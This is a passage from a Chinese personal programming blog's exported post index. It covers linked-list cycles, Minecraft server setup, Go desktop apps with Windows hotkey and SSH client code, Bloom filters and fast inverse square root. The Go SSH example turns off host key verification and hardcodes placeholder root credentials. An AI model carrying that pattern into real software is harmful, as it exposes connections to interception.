(null != next) &#123;        for (int i = 0; i &lt; list.size(); i++) &#123;            if (list.get(i) == next) &#123;                System.out.println(&quot;环的长度：&quot; + (list.size() - i));                return next;            &#125;        &#125;        list.add(next);        next = next.next;    &#125;    return null;&#125;\n\n使用快慢指针的解法设置快慢指针，慢指针每次走一步，快指针每次走两步。有两个结论：\n\n如果链表有环，则他们一定会在环中相遇\n相遇后，让两个指针分别从表头和相遇点出发，每次走一步，最后一定会在环入口相遇\n\n证明1：首先快指针比慢指针走得快，所以当慢指针进入环中时，快指针一定在环中。这时，相当于快指针在追慢指针。在慢指针走一圈之内一定会追上。\n证明2：表头到环入口长度为 a环入口到相遇点长度为 b相遇点到环入口长度为 c\n\n快慢指针都从表头出发，到在相遇点相遇时：慢指针路程为 a + b快指针路程为 a + (b + c) * k + b 其中 (b+c) 是环长度，k是环的圈数。k&gt;&#x3D;1快指针路程是慢指针的两倍： a + (b + c) * k + b = 2 * (a + b)\n化简可以得到 a = (k - 1)(b + c) + c他的意思是：表头到环入口的距离 &#x3D; 相遇点到环入口的距离 + (k - 1)圈环长度所以两指针分别从表头和相遇点出发，最后会在环入口相遇。\n环长度可以让一指针从相遇点出发，另一指针在原地等。第一次相遇所走过的长度即为环长度\n时间复杂度为 O(n)空间复杂度为 O(1)\n代码实现：\n/** * 判断一个链表是否有环，并返回环的入口 * 使用快慢指针实现 */public static Node findLoopPort2(Node head) &#123;    Node p1 = head.next;    Node p2 = head.next;    while (p1.next != null &amp;&amp; p2.next != null) &#123;        p1 = p1.next;        p2 = p2.next.next;        // 有环，会在环中某节点相遇        if (p1 == p2) &#123;            break;        &#125;    &#125;    // 无环 返回null    if (p1.next == null || p2.next.next == null) &#123;        return null;    &#125;    // 有环，计算环长度    int count = 1;    p1 = p1.next;    while (p1 != p2) &#123;        p1 = p1.next;        count++;    &#125;    // 有环，两指针分别从起点和相遇点触发，最后会在环入口相遇    p1 = head.next;    while (p1 != p2) &#123;        p1 = p1.next;        p2 = p2.next;    &#125;    System.out.println(&quot;环的长度：&quot; + count);    return p1;&#125;\n\n参考：链表中环的入口节点 膜拜大佬！\n","categories":["学习笔记"],"tags":["java","算法","链表","环"]},{"title":"南京总统府","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E5%8D%97%E4%BA%AC%E6%80%BB%E7%BB%9F%E5%BA%9C/","content":"前言无意间发现小米云空间满了，点进去一看，原来是自动备份给塞满了。然后发现了以前出去玩的照片，或许不是自动备份的话，它们也许就消失了。所以我想，博客或许也是另一种备份的方式。\n这些照片是 2022-01-21 拍的本来打算上午去鸡鸣寺，下午去总统府的（通了地铁，直通南京是真的爽）。但是早上到南京之后，鸡鸣寺那天并没有开门（没记错的话，应该是疫情管控。可恶的疫情啊）\n另外，中午吃的那家鸭血粉丝是真的不好吃（这个倒是记得蛮清楚的）。\n照片图片顺序就无所谓了。能找到就不错了\n\n最后陪我去的憨憨的背影单独放\n","categories":["记录生活"],"tags":["游","南京","多图"]},{"title":"如何搭建minecraft服务器","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BAminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"前言首先来简单介绍下 minecraft 的服务端。服务端主要有 Bukkit、Spigot、Paper、Sponge 等。主要提供接口以供开发插件。模组加载器主要有 forge、fabric 等。主要也是提供接口以提供额外的功能，主要是兼容各个模组不互相冲突。（该冲突的还是躲不掉的）\n插件与模组的主要区别是：\n\n插件是增加游戏内容，而不修改。但模组可以修改游戏内容，增加新的东西（物品&#x2F;生物等等，但插件做不到）。\n插件运行在服务端。模组则是服务端客户端都可以运行。\n\n这里主要内容是搭建，关于插件与模组的编写不做过多介绍（主要我也没怎么写过插件和模组）。这里贴几个链接：\n以下主要是官网，因为 minecraft 的插件和模组官方并不提供，属于第三方社区开发和维护（为爱发电）\nforge 官网spigot 与 Bukkit 官网Paper 官网\n我认为比较好的教程：Bukkit API 教程开服教程szszss大佬的博客 大佬的博客主要有模组与光影的编写教程\n前期准备首先得有一个服务端核心文件，上面所说的几个都可以。官网有服务端核心文件的下载链接。其次就是要注意 minecraft 与 Java 的版本关系。这里不列举了，下载时应该有（也许\n服务端核心文件为一个 jar 包。\n搭建这里我以 spigot-1.18.2 的核心作为示例。\n第一次运行核心 jar 文件\njava -jar spigot-1.18.2.jar\n当然，你也可以编写一个启动脚本，以配置启动环境以及更多的启动参数。\n第一次运行结束之后，会生成一些文件。需要修改的是 eula.txt ，同意 MINECRAFT 最终用户许可协议。如下：\neula=true\n\n其次就是 server.properties 。里面主要是服务器的一些配置项。包括端口号、正版验证、白名单、连接超时时间等等配置项。详细配置项可以 Google 一下\n修改完成后，第二次运行核心 jar在经过漫长的世界生成和加载之后，出现 done，便成功启动了。随后启动对应版本的游戏，在多人游戏中加入服务器即可（默认端口号为 25565）\n\n此时便可以多人游玩了，服务器搭建完成。\n其他众所周知，Java 是虚拟机语言，是跨平台的。所以以上操作在 linux 和 windows 中是完全一样的。当然，建议服务器使用 linux 并且使用 screen 在后台运行。\n云服务器注意防火墙给端口放行。\nbukkit、spigot 等插件服务端核心会生成 plugins 文件夹，用于存放插件。插件也是以 jar 包形式载入。forge、fabric 等模组服务端核心会生成 mods 文件夹，用于存放模组资源。模组也是以 jar 包形式载入。那么，模组与插件可不可以同时存在呢？答案是可以的，我找到一个项目，提供了几乎与所有插件和模组兼容的服务端核心。它叫 Mohist \nMohist 官网\n我下载了 mohist-1.18.2-8-server.jar Forge: 40.2.1 并成功地运行了。由于我并没有在它的服务端核心上测试运行模组和插件，所以不做过多的评价。\n一点点评价就是，我认为可以同时运行插件和模组是很酷的事情。模组提供更多的可玩性内容，插件提供更多服务器特色的内容。用于服务器的模组比较常见的有，匠魂、冰与火之歌、拔刀剑、工业、暮色、宝可梦、以及国产模组原初修真等。用于服务器的插件大多是定制的，像是登录、领地、地皮等功能，个性化程度较高。\nEND祝想要开服的小伙伴成功开服，并长期运营。\n《蓝易云》教程征集\n","categories":["编程记录"],"tags":["java","minecraft","服务器"]},{"title":"孤独的根号三","url":"/%E5%85%B6%E4%BB%96/%E5%AD%A4%E7%8B%AC%E7%9A%84%E6%A0%B9%E5%8F%B7%E4%B8%89/","content":"作者作品名称\t孤独的根号三外文名\tTheSquareRootofThree作者\t\tDavidFeinberg创作年代\t2008年\n英文I fear that I will always be A lonely number like root threeA three is all that’s good and rightWhy must my three keep out of sight Beneath a vicious square-root sign?I wish instead I were a nineFor nine could thwart this evil trick With just some quick arithmeticI know I’ll never see the sunAs 1.7321Such is my reality A sad irrationalityWhen,hark, just what is this I see?Another square root of a threeHas quietly come waltzing byTogether now we multiplyTo form a number we preferRejoicing as an integerWe break free from our mortal bondsAnd with a wave of magic wandsOur square-root signs become ungluedAnd love for me has been renewedI can’t promise you the kind of lifestyle that fairy tale likeAnd I can’t promise you that I’m gonna mature overnightBut what I can promise you is that I will always love youAnd I will never try and make you into something that you can not\n中文我害怕我会永远是那孤独的根号三三本身是一个多么美妙的数字我的这个三为何躲在那难看的根号下我多么希望自己是一个九因为九只需要一点点小小的运算便可摆脱这残酷的厄运我知道自己很难再看到自己的太阳就像这无休无止的1.7321我不愿我的人生如此可悲直到那一天我看到了另一个根号三如此美丽无瑕翩翩舞动而来我们彼此相乘得到那梦寐以求的数字像整数一样圆满我们砸碎命运的枷锁轻轻舞动爱情的魔杖我们的平方根 已经解开我的爱重获新生我无法保证能给你童话般的世界也无法保证自己能在一夜之间长大但是我保证你可以向公主一样永远生活在自由 幸福之中\n","categories":["其他"],"tags":["诗歌"]},{"title":"对桌面应用的一些想法","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%AF%B9%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/","content":"为什么想做桌面应用最近在学习 go 语言。产生了用 go 做点东西的想法。\n之前一直在学习 Java。Java 嘛，就是 spring 那套东西，做后端，写接口，操作数据库，连中间件。最后做出来的东西就是对外暴露的接口，没有界面。或者说大部分都是前端做的界面。最然我也会写 vue，用些组件也能做些好看的页面。但始终差点意思。\n我的意思是，那是个网站。需要服务器部署，需要网络，需要浏览器…他不是一个我想要的程序，它过于臃肿和专业。（当然，后面才发现还有更臃肿的。\n所以，我想做的或许是桌面程序。\n技术选型个人的桌面程序，理想状态肯定是要小而美的。所以选的标准就是 GUI界面和性能\n开发语言选择 go 作为开发语言。首先是因为我在学的缘故，想用它做点东西。另一方面就是界面渲染和后台任务肯定是异步的，go 在这方面有优势。也有助于我学习多线程。\nGUI 框架然后是 GUI 框架的选择。我不可能使用图形 api 直接去绘制 gui，这工作量是非常巨大，并且十分痛苦的。之前有使用 C++ 和 OpenGL 的经历，十分的痛苦。所以也十分佩服做 GUI 框架的人。\n一开始选择的时候，GUI 框架还是非常多的，不过水平参差不齐。主流的其实并不多可以参考下面的文章和一个知乎回答\n2022年5月，桌面软件开发框架大赏Go 语言这么强大，为什么没变成开发桌面软件主力语言呢？ - shaoyuan的回答 - 知乎\nGUI 大致分为两大类。一类是原生实现。基于自制的绘图引擎或者 SDL、GLW之类的绘图引擎。另一类就是跨平台的。基于浏览器绘制图形的 Electron 等，或者基于 Java 的 JavaFX、Swing 等。\n基本没什么可以选择的余地，因为开发语言是比较新的 go。\n首先选择使用的就是 Fynefyne githubfyne 是基于 OpenGL 和 GLFW 实现的。写出来的界面大概是下面这种风格\n说实话，不是我喜欢风格。并且 Fyne 也不支持自定义！打包出来的 exe 程序大小在 28MB 往上。所以劝退了。\n然后选择使用的是 (wails)[https://wails.io/]wails githubwails 可以看作为 Go 的快并且轻量的 Electron 替代品wails 不嵌入浏览器，因此性能高。它使用平台的原生渲染引擎。在 Windows 上，是基于 Chromium 构建的新 Microsoft Webview2 库。写出来的界面风格随意，因为前端是使用浏览器的那一套。下面是无边框，并且半透明，亚克力质感的界面。（页面完全自定义，所以白条也是自己写的，忽略就好\nwails 打包出来的 exe 程序大小在 8MB 往上，不过得依赖 webview2。处理 WebView2 运行时依赖到这都很好，下面是缺点。wails 是比较初级的，功能并没有那么完善。比如目前最高版本 v2.5.1 只支持单窗口应用、没有托盘图标、缺少一些系统事件（全局热键、聚焦失焦等）。总之，虽然界面上给了很多自由，但不透明的地方很多，主要是与操作系统交互的部分。看Wails v3 路线这些后续都会有吧，不过 v3 遥遥无期啊。\n架构方面这块是遇到问题请教 布拉 大佬的时候，给我说的一些建议。\n首先，布拉大佬是个喜欢函数式编程的人。他认为 go 的设计有问题。建议我换个语言。啊这，很难受啊。虽然我也觉得有设计不合理的地方，但应该是不会换了。尝试新语言大概是因为没有历史包袱吧（这里点名批评 C++\n然后就是架构上的建议。前后端分离，嗯，没错。桌面应用也这样。后端作为前端的守护进程，前端页面关闭多少次都无所谓，后端关闭就彻底关闭了。好处就是，可以多机一起用。（当然，我是没这个需求\n其实 wails 就是这么搞的，不过封装程度比较高，不透明，基本不能自定义。就那么一个窗口给你玩。很多应用也是这么搞的。不过对我来说，有点难啊。一点经验没有。因为前端实在是不想用 Electron ，这玩意打包出来实在是太大，难以接受。（跳佬写的聊天室软件，解压出来 223MB。也许有很好的减小体积的方法，不过每个 Electron 应用都包含了整个 V8 引擎和 Chromium 内核。我觉得不会小到哪里去。\n或许在 Windows 上，C++ 和 C# 才是小而美的最优解？\n补充Windows Api在使用 windows api 之前，要先了解一个东西，叫 windows 消息机制。基于 Windows 的应用程序是事件驱动的。 它们不会 (（如 C 运行时库调用）进行显式函数调用，) 获取输入。 而是等待系统向其传递输入。这里简单介绍下，详细参考微软的文档关于消息和消息队列\n一个 GUI 线程有一个消息队列，一个线程有多个窗口，所有窗口共享一个消息队列。比如按下鼠标右键，系统会产生一个消息 WM_RBUTTONDOWN 并将这个消息放到当前窗口所属线程的消息队列中。应用程序通过一个循环监听这个消息队列，不断从中获取消息，然后处理，做出相对的响应。\n消息的结构 msg 结构 (winuser.h)\ntypedef struct tagMSG &#123;  HWND   hwnd; // 接收消息的窗口句柄  UINT   message; // 消息的常量标识符（消息号）  WPARAM wParam; // 32位消息的附加信息  LPARAM lParam; // 32位消息的附加信息  DWORD  time; // 消息发布时间  POINT  pt; // 发布消息时光标在屏幕坐标系中的位置&#125; MSG, *PMSG, *NPMSG, *LPMSG;\n\n知道消息的结构和消息的机制之后，就可以调用 windows api 和系统进行一些交互了。下面用 go 演示注册 windows 热键\npackage mainimport (\t&quot;fmt&quot;\t&quot;syscall&quot;\t&quot;unsafe&quot;)// MSG 来自线程的消息队列的消息信息type MSG struct &#123;\tHWND   uintptr\tUINT   uintptr\tWPARAM int16\tLPARAM int64\tDWORD  int32\tPOINT  struct &#123;\t\tX int32\t\tY int32\t&#125;&#125;// 常量值 fsModifiers 参数可以是以下值的组合。const (\tModAlt = 1 &lt;&lt; iota\tModCtrl\tModShift\tModWin)// HotKey 热键的结构体type HotKey struct &#123;\tId        int // 唯一 id 标识\tModifiers int // 修饰符的常量值\tKeyCode   int // 按键的值&#125;var user32 *syscall.DLLvar registerHotKey *syscall.Procvar unregisterHotKey *syscall.Procvar peekMsg *syscall.Procvar waitMsg *syscall.Procfunc main() &#123;\t// 获取 dll 资源以调用 windows 系统 api\tuser32 = syscall.MustLoadDLL(&quot;user32&quot;)\tregisterHotKey = user32.MustFindProc(&quot;RegisterHotKey&quot;)\tunregisterHotKey = user32.MustFindProc(&quot;UnregisterHotKey&quot;)\tpeekMsg = user32.MustFindProc(&quot;PeekMessageW&quot;)\twaitMsg = user32.MustFindProc(&quot;WaitMessage&quot;)\t// 定义热键\tkeys := []*HotKey&#123;\t\t&#123;1, ModAlt, &#x27;Z&#x27;&#125;,            // ALT+Z\t\t&#123;2, ModAlt + ModShift, &#x27;X&#x27;&#125;, // ALT+SHIFT+X\t\t&#123;3, ModAlt + ModCtrl, &#x27;C&#x27;&#125;,  // ALT+CTRL+C\t&#125;\t// 注册热键\tfor _, hotkey := range keys &#123;\t\thotkey.registerOneHotKey()\t&#125;\tdefer func() &#123;\t\tfor _, hotkey := range keys &#123;\t\t\thotkey.unregisterOneHotKey()\t\t&#125;\t&#125;()\t// 监听消息\tfor &#123;\t\tvar msg = &amp;MSG&#123;&#125;\t\tres, _, _ := peekMsg.Call(uintptr(unsafe.Pointer(msg)), 0, 0, 0, 1)\t\tif res == 0 &#123;\t\t\t_, _, _ = waitMsg.Call(uintptr(unsafe.Pointer(msg)), 0, 0, 0, 1)\t\t&#125; else &#123;\t\t\t// 注册 id 在 WPARAM 字段\t\t\tif id := msg.WPARAM; id != 0 &#123;\t\t\t\t// 这里可以对按键进行分别处理\t\t\t\t// 这里就简单打印按了什么\t\t\t\thotKey := keys[id-1]\t\t\t\tfsModifiers := &quot;&quot;\t\t\t\tmodifier := hotKey.Modifiers\t\t\t\tfmt.Println(hotKey)\t\t\t\tif modifier%2 == 1 &#123;\t\t\t\t\tfsModifiers += &quot; alt&quot;\t\t\t\t&#125;\t\t\t\tmodifier = modifier &gt;&gt; 1\t\t\t\tif modifier%2 == 1 &#123;\t\t\t\t\tfsModifiers += &quot; ctrl&quot;\t\t\t\t&#125;\t\t\t\tmodifier = modifier &gt;&gt; 1\t\t\t\tif modifier%2 == 1 &#123;\t\t\t\t\tfsModifiers += &quot; shift&quot;\t\t\t\t&#125;\t\t\t\tmodifier = modifier &gt;&gt; 1\t\t\t\tif modifier%2 == 1 &#123;\t\t\t\t\tfsModifiers += &quot; win&quot;\t\t\t\t&#125;\t\t\t\tfmt.Printf(&quot;热键值:%s+%c\\n&quot;, fsModifiers, hotKey.KeyCode)\t\t\t\t// 退出热键\t\t\t\tif id == 1 &#123;\t\t\t\t\tbreak\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;&#125;// 注册单个热键func (h *HotKey) registerOneHotKey() &#123;\tres, _, err := registerHotKey.Call(0, uintptr(h.Id), uintptr(h.Modifiers), uintptr(h.KeyCode))\tif res == 0 &#123;\t\tfmt.Println(&quot;注册热键失败：&quot;, h, &quot;error&quot;, err)\t&#125; else &#123;\t\tfmt.Println(&quot;注册热键成功：&quot;, h)\t&#125;&#125;// 注销单个热键func (h *HotKey) unregisterOneHotKey() &#123;\tres, _, err := unregisterHotKey.Call(0, uintptr(h.Id))\tif res == 0 &#123;\t\tfmt.Println(&quot;注销热键失败：&quot;, h, &quot;error&quot;, err)\t&#125; else &#123;\t\tfmt.Println(&quot;注销热键成功：&quot;, h)\t&#125;&#125;\n\n运行结果\n注册热键成功： &amp;&#123;1 1 90&#125;注册热键成功： &amp;&#123;2 5 88&#125;注册热键成功： &amp;&#123;3 3 67&#125;&amp;&#123;2 5 88&#125;热键值: alt shift+X&amp;&#123;3 3 67&#125;热键值: alt ctrl+C&amp;&#123;1 1 90&#125;热键值: alt+Z注销热键成功： &amp;&#123;1 1 90&#125;注销热键成功： &amp;&#123;2 5 88&#125;注销热键成功： &amp;&#123;3 3 67&#125;进程 已完成，退出代码为 0\n\n更多函数（api）参考微软文档 Win32 API 的编程参考。\n关于 sshwails 虽然有缺点，但是也只能用了。毕竟 GUI 框架没上面可以选。因为只能单窗口，所以想做类似 utools 的工具集就不太可能了。毕竟理想来说每个工具都是一个窗口。其次就是前后台切换运行时，焦点的处理。wails的窗口没有句柄（wails官网博客-v3路线中说的），不能与窗口进行交互。所以要使用它提供的运行时 api，不过 api 有点少。最后还有个开机自启动的功能。还没研究过，不过有人在 issue 里提了，估计是没法实现。\n所以工具集就算了，只能换个想做的的东西了。（当然也没做成最后想到的是 ssh 客户端。因为我现在用的是 WinSCP 和 PuTTY 集成使用的方案，上古 UI ，并且不是那么方便。（其实也还好，都是 shell 操作。\n没做成是因为它有些难，关于 io 流 和 异步。虽然 go 有优势，但我还不太熟。异步的问题在 windows api 做热键的时候就有了，不过问题还不是那么大。到 ssh 这，肯定要多终端连接。代码是一点都写不下去输出的 io 流我暂时也没办法输出到 wails 的窗口上。所以就没做成。\n不过有示例，输出到控制台倒是没问题。\npackage mainimport (\t&quot;fmt&quot;\t&quot;golang.org/x/crypto/ssh&quot;\t&quot;golang.org/x/term&quot;\t&quot;log&quot;\t&quot;os&quot;)func main() &#123;\tvar (\t\tusername = &quot;root&quot;\t\tpassword = &quot;password&quot;\t\taddr     = &quot;ip:port&quot;\t)\tconfig := &amp;ssh.ClientConfig&#123;\t\tUser: username,\t\tAuth: []ssh.AuthMethod&#123;\t\t\tssh.Password(password),\t\t&#125;,\t\tHostKeyCallback: ssh.InsecureIgnoreHostKey(),\t&#125;\tconn, err := ssh.Dial(&quot;tcp&quot;, addr, config)\tif err != nil &#123;\t\tlog.Fatal(&quot;连接失败: &quot;, err)\t&#125;\tdefer func(conn *ssh.Client) &#123;\t\terr := conn.Close()\t\tif err != nil &#123;\t\t\tfmt.Println(err)\t\t\treturn\t\t&#125;\t&#125;(conn)\t// 创建会话\tsession, err := conn.NewSession()\tif err != nil &#123;\t\tlog.Fatal(&quot;无法创建会话: &quot;, err)\t&#125;\tdefer func(session *ssh.Session) &#123;\t\terr := session.Close()\t\tif err != nil &#123;\t\t\tfmt.Println(err)\t\t\treturn\t\t&#125;\t&#125;(session)\t// file, _ := os.OpenFile(&quot;./resources/a.txt&quot;, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0600)\t// 设置会话的标准输出、错误输出、标准输入\tsession.Stdout = os.Stdout\tsession.Stderr = os.Stderr\tsession.Stdin = os.Stdin\t// 设置终端参数\tmodes := ssh.TerminalModes&#123;\t\tssh.ECHO:          1,     // 启用回显\t\tssh.TTY_OP_ISPEED: 14400, // input speed = 14.4kb\t\tssh.TTY_OP_OSPEED: 14400, // output speed = 14.4kb\t&#125;\t// 获取当前标准输出终端窗口尺寸 该操作可能有的平台上不可用，那么下面手动指定终端尺寸即可\ttermWidth, termHeight, err := term.GetSize(int(os.Stdout.Fd()))\tif err != nil &#123;\t\tlog.Fatal(&quot;无法获取终端大小: &quot;, err)\t&#125;\t// 设置虚拟终端与远程会话关联\tif err := session.RequestPty(&quot;xterm&quot;, termHeight, termWidth, modes); err != nil &#123;\t\tlog.Fatal(&quot;请求虚拟终端失败: &quot;, err)\t&#125;\t// 启动远程Shell\tif err := session.Shell(); err != nil &#123;\t\tlog.Fatal(&quot;启动shell失败: &quot;, err)\t&#125;\t// 阻塞直至结束会话\tif err := session.Wait(); err != nil &#123;\t\tlog.Fatal(&quot;退出异常: &quot;, err)\t&#125;&#125;\n\n运行结果\nLast login: Thu Aug 10 14:40:10 2023 from 58.221.220.122[root@VM-16-9-centos ~]# pwdpwd/root[root@VM-16-9-centos ~]# [root@VM-16-9-centos ~]# cd notecd note[root@VM-16-9-centos note]# [root@VM-16-9-centos note]# lllltotal 229992drwxr-xr-x 4 root root      4096 Jul 20 19:01 dist      drwxr-xr-x 9 root root      4096 Jul 20 16:28 jdk-17.0.8-rwxr-xr-x 1 root root 182376116 Jun 16 02:47 jdk-17_linux-x64_bin.tar.gz-rwxr-xr-x 1 root root  26556781 Jul 21 09:27 privateNote-0.0.1-SNAPSHOT.jar-rw-r--r-- 1 root root  26556825 Jul 22 21:33 privateNote.jar[root@VM-16-9-centos note]#[root@VM-16-9-centos note]# exitexitlogoutEOF进程 已完成，退出代码为 0\n\nEND得去深入学习下 io 流 和 多线程桌面应用就这样吧，主要 wails v2 版本功能还是太少了。等 v3 正式版再来用 go 玩玩桌面应用。\n最后放一个知乎的问题吧(现在整个 Web 前端是「屎山」吗？)[https://www.zhihu.com/question/511853234/answer/2324956267]\n不能说 web 吧，我觉得几乎所有的都是。\n","categories":["编程记录"],"tags":["golang","桌面应用","Windows Api","ssh"]},{"title":"布隆过滤器","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8/","content":"介绍布隆过滤器（Bloom Filter）是1970年由布隆提出的。它实际上是一个很长的二进制向量和一系列随机映射函数。布隆过滤器可以用于检索一个元素是否在一个集合中。它类似一个hash set，用来判断某个元素（key）是否在某个集合中。但和一般的hash set不同的是，这个算法无需存储key的值，对于每个key，只需要k个比特位，每个存储一个标志，用来判断key是否在集合中。它的优点是空间效率和查询时间都比一般的算法要好的多。缺点是有一定的误识别率、无法获取元素本身和删除困难。\n他的使用场景：布隆过滤器可以告诉我们“某个东西一定不存在或可能存在”。即布隆过滤器说不存在即一定不存在，说存在可能不存在（误判）\n\n邮件过滤，使用布隆过滤器来做邮件黑名单过滤\n对爬虫网址进行过滤，爬过的不再爬\n解决新闻推荐过的不再推荐总的来说，即用于黑名单过滤\n\n原理哈希函数哈希函数的概念是：将任意大小的输入数据转换成特定大小的输出数据的函数，转换后的数据称为哈希值或哈希编码，也叫散列值。所有散列函数都有如下基本特性：\n\n如果两个散列值是不相同的（根据同一函数），那么这两个散列值的原始输入也是不相同的。这个特性是散列函数具有确定性的结果，具有这种性质的散列函数称为单向散列函数。\n散列函数的输入和输出不是唯一对应关系的，如果两个散列值相同，两个输入值很可能是相同的，但也可能不同，这种情况称为“散列碰撞（collision，哈希碰撞）”。但是用 hash表存储大数据量时，空间效率还是很低，当只有一个 hash 函数时，还很容易发生哈希碰撞。\n\n布隆过滤器数据结构布隆过滤器由一个固定大小的二进制向量或位图（bitmap）和一系列映射函数组成。在初始状态下，对于长度为m的位数组，他所有位置都被置为0。如下图：\n当有元素被加入集合时，通过k个映射函数将这个元素映射成位图中的k个点，将它们的值置为1。假如有两个元素通过三个映射函数，如下图：\n当查询某个元素是都存在时，只要通过k个映射函数，看对应位图中的k个点的值是否都为1。\n\n如果这些点有任意一个为0，则元素一定不存在。\n如果都是1，则元素可能存在。为什么是可能存在，不是一定存在。是因为映射函数本身是散列函数，散列函数会有碰撞（即使碰撞概率可以很低）。\n\n误判率布隆过滤器的误判是指多个输入经过哈希之后在相同的bit位 置1 了，这样就无法判断究竟是哪个输入产生的，因此误判的根源在于相同的bit位被多次映射且置1。这种情况也造成了布隆过滤器的删除问题，因为布隆过滤器的每一个bit并不是独占的，很有可能多个元素共享了某一位。如果我们直接删除这一位的话，会影响其他的元素。（比如上图中的第3位）\n布隆过滤器可以添加元素，但不能删除元素。因为删除元素会导致误判率的增加。\n关于误判率的计算（略）参考布隆过滤器概念及其公式推导 转载其中可以根据 样本量和期望的失误率 得出具体需要 多少存储空间和哈希函数的个数布隆过滤器只与样本量和失误率有关，与单样本大小无关（因为它会经过哈希函数）\n布隆过滤器的实现codingpackage BloomFilter;import java.util.BitSet;/** * 布隆过滤器 */public class BloomFilter &#123;    // 长度为10亿的比特位    private static final int DEFAULT_SIZE = 256 &lt;&lt; 22;    // 使用的哈希函数（8个）    private static final int[] seeds = &#123;3, 5, 7, 11, 13, 17, 19, 23&#125;;    private static final HashFunction[] functions = new HashFunction[seeds.length];    // 初始化布隆过滤器    private static BitSet bitSet = new BitSet(DEFAULT_SIZE);    /**     * 构造函数，初始化哈希函数     */    public BloomFilter() &#123;        for (int i = 0; i &lt; seeds.length; i++) &#123;            functions[i] = new HashFunction(DEFAULT_SIZE,seeds[i]);        &#125;    &#125;    /**     * 添加元素     */    public void add(String value)&#123;        if (value!=null)&#123;            for(HashFunction f : functions)&#123;                bitSet.set(f.hash(value),true);            &#125;        &#125;    &#125;    /**     * 判断元素是否存在     */    public boolean contains(String value)&#123;        if (value==null)&#123;            return false;        &#125;        boolean result = true;        // 遍历所有哈希结果对应比特位，有一个返回false即break（不存在）        for(HashFunction f :functions)&#123;            result = bitSet.get(f.hash(value));            if (!result)&#123;                break;            &#125;        &#125;        return result;    &#125;&#125;/** * 哈希函数 */class HashFunction &#123;    private final int size;    private final int seed;    public HashFunction(int size, int seed) &#123;        this.size = size;        this.seed = seed;    &#125;    /**     * 使用加法哈希算法     */    public int hash(String value) &#123;        int result = 0;        int len = value.length();        for (int i = 0; i &lt; len; i++) &#123;            result = seed * result + value.charAt(i);        &#125;        return (size - 1) &amp; result;    &#125;&#125;\n\n测试：\nimport BloomFilter.BloomFilter;import org.junit.Test;public class BloomFilterTest &#123;    @Test    public void bloomFilter() &#123;        BloomFilter bloomFilter = new BloomFilter();        for (int i = 0; i &lt; 100000; i++) &#123;            bloomFilter.add(String.valueOf(i));        &#125;        System.out.println(bloomFilter.contains(&quot;1&quot;));        System.out.println(bloomFilter.contains(&quot;2&quot;));        System.out.println(bloomFilter.contains(&quot;3&quot;));        System.out.println(bloomFilter.contains(&quot;100001&quot;));    &#125;&#125;\n\n运行结果：\ntruetruetruefalse\n\nGuava 中的 BloomFilter依赖：\n&lt;dependency&gt;    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;    &lt;artifactId&gt;guava&lt;/artifactId&gt;    &lt;version&gt;31.0.1-jre&lt;/version&gt;&lt;/dependency&gt;\n\n使用：\n@Testpublic void test() &#123;    BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), 100000, 0.0001);    for (int i = 0; i &lt; 100000; i++) &#123;        bloomFilter.put(i);    &#125;    System.out.println(bloomFilter.mightContain(1));    System.out.println(bloomFilter.mightContain(2));    System.out.println(bloomFilter.mightContain(3));    System.out.println(bloomFilter.mightContain(100001));&#125;\n\n运行结果：\ntruetruetruefalse\n\n总结关于哈希函数有空再仔细研究研究（咕咕咕）\n参考文章：布隆过滤器(Bloom Filter)详解十分钟理解布隆过滤器布隆过滤器，这一篇给你讲的明明白白布隆过滤器概念及其公式推导 转载\n","categories":["学习笔记"],"tags":["数据结构","哈希","过滤"]},{"title":"平方根倒数快速算法","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B9%B3%E6%96%B9%E6%A0%B9%E5%80%92%E6%95%B0%E5%BF%AB%E9%80%9F%E7%AE%97%E6%B3%95/","content":"介绍来看段代码，由 格雷格·沃什 所写。注释由 卡马克 所写。用于快速求平方根倒数。常用于在3D图形编程。随《雷神之锤3》代码开源以及卡马克注释中优雅的评价而出名。\nfloat Q_rsqrt(float number)&#123;    long i;    float x2, y;    const float threehalfs = 1.5F;        x2 = number * 0.5F;    y = number;    i = * ( 1ong * ) &amp;y; // evil floating point bit level hacking    i = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck?    y = * ( float * ) &amp;i;    y = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration    // y = y * ( threehalfs - ( x2 * y * y ) ); // 2st iteration this can be removed    return y;&#125;\n\n如何求平方根比如求 2 的平方根，要精确到 7 位小数。把问题转化下，其实是求 y&#x3D;x^2-2 这个函数与 x 轴的交点。由于这个函数是条曲线，交点坐标不好求。那么可以用一条直线近似代替曲线，什么样的直线可以呢？是 切线取 x&#x3D;2 处的切线（y&#x3D;4x-6），近似代替曲线。如图：\n\n近似替代后，得到交点坐标为 (1.5,0) 那么 根号2 的一个近似值就是 1.5。那么这个精度还是不够的。\n如何解决呢？答案是取这个点处的切线（y&#x3D;3x-4.25）继续近似替代。如图：\n\n此时，近似值来到了 1.4166666666666667在多次这样的操作之后，近似值的精度会越来越高。第三次近似值：1.4142156862745099第四次近似值：1.4142135623746899第五次近似值：1.4142135623730951大概第四次第五次就达到想要的精度了。\n这个方法就是 牛顿法，被广泛用于近似求解各种方程。牛顿法的公式可以简化：\n\n手算这么多位的小数肯定会头皮发麻，但计算机不会。而且牛顿法每步迭代公式都一样，给计算机算太合适了。\nfunc Q_rsqrt() &#123;\t// 初始值\tx := 2.0\tprecision := 1e-7 // 预定精度\t// 牛顿法迭代函数\tfx := func(x float64) float64 &#123;\t\treturn x*x - 2\t&#125;\t// 牛顿法迭代公式（导函数）\tdfx := func(x float64) float64 &#123;\t\treturn 2 * 